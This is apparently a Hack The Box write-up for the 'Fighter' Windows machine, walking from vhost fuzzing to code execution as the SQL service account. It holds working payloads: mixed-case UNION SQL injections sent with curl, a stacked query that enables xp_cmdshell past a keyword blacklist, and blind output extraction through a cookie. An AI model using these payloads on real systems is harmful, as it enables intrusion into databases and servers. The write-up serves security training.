## Overview

Fighter is an insane-difficulty Windows box that exposes only port 80. The catch is a hidden virtual host, `members.streetfighterclub.htb`, whose legacy `/old/` login page is vulnerable to SQL injection in the **numeric** `logintype` parameter. The app "defends" itself with a keyword blacklist and by uppercasing the field — but SQL keywords are case-insensitive, so `uNiOn` and `Xp_cMdShElL` slip right through. The injection is a `sysadmin` MSSQL account, so enabling `xp_cmdshell` gives command execution as `fighter\sqlserv` and access to the user flag. This post covers recon through the user flag.

Enumeration-driven (vhost fuzzing then dir-busting to a legacy login) MSSQL injection where the custom case-obfuscation blacklist bypass and blind exit-via-cookie extraction carry the box; no CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80/tcp | HTTP | Microsoft IIS 8.5, ASP.NET, "StreetFighter Club" |

Only one port. IIS 8.5 means Windows Server 2012 R2. The homepage is static, so the next move is virtual-host discovery against the `streetfighterclub.htb` domain.

```bash
nmap -sC -sV 10.129.228.121
nmap -p- --min-rate 2000 10.129.228.121
```

## Enumeration

The base site responds to every Host header with the same 6911-byte page (a wildcard), so vhost fuzzing has to filter that size out:

```bash
ffuf -u http://10.129.228.121/ -H "Host: FUZZ.streetfighterclub.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 6911
```

This reveals `members.streetfighterclub.htb` (403 on its root). Add both names to `/etc/hosts`, then brute-force content on the members vhost:

```bash
# 10.129.228.121 streetfighterclub.htb members.streetfighterclub.htb
gobuster dir -u http://members.streetfighterclub.htb/ -w /usr/share/wordlists/dirb/common.txt -x asp,aspx
gobuster dir -u http://members.streetfighterclub.htb/old/ -w /usr/share/wordlists/dirb/common.txt -x asp,aspx
```

That surfaces a legacy login under `/old/`: `login.asp` posts to `verify.asp` with `username`, `password`, `logintype`, and `rememberme`. On a successful lookup the app base64-encodes a database column into the `Email` cookie — turning the login into a readable injection oracle.

## Foothold

Probing the fields shows the numeric `logintype` parameter is the injection point (numeric context → stacked queries), and `rememberme=ON` is required to trigger the code path that reflects a column into the `Email` cookie. The app uppercases the field, so the keyword blacklist only matters if you write keywords in lowercase — mixed-case bypasses it.

Confirm the injection and the privilege level (each payload is pasted as the `logintype` value; the answer comes back base64-encoded in the `Set-Cookie: Email` header, column 5 of a 6-column query):

```bash
# returns the SQL Server version banner
curl -s -i -d "username=admin&password=wrong&rememberme=ON" \
  --data-urlencode "logintype=1 uNiOn sElEcT 1,2,3,4,@@version,6" \
  http://members.streetfighterclub.htb/old/verify.asp | grep -i "Set-Cookie: Email"

# IS_SRVROLEMEMBER('sysadmin') returns 1 — we are sysadmin
curl -s -i -d "username=admin&password=wrong&rememberme=ON" \
  --data-urlencode "logintype=1 uNiOn sElEcT 1,2,3,4,IS_SRVROLEMEMBER('sysadmin'),6" \
  http://members.streetfighterclub.htb/old/verify.asp | grep -i "Set-Cookie: Email"
```

As `sysadmin` we can turn on `xp_cmdshell` with a stacked query — the keyword is case-obfuscated so it never matches the blacklist:

```sql
1;EXEC sp_configure 'show advanced options',1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Xp_cMdShElL',1;RECONFIGURE WITH OVERRIDE;--
```

Command output is read back blind: run the command into a temporary table, then UNION-extract each row through the same `Email` cookie:

```sql
1;IF OBJECT_ID('o') IS NOT NULL DROP TABLE o;CREATE TABLE o(id int identity,line varchar(8000));INSERT INTO o(line) EXEC Xp_cMdShElL 'whoami';--
1 uNiOn sElEcT 1,2,3,4,(SELECT line FROM o WHERE id=1),6
```

The second query returns `fighter\sqlserv` — code execution as the SQL service account.

## User flag

With command execution as `fighter\sqlserv`, the user flag is within reach:

```bash
type C:\Users\decoder\Desktop\user.txt   # HTB{...}
```

Code execution achieved through a blacklisted-but-bypassable MSSQL injection. Privilege escalation is left as an exercise; this post stops at user.
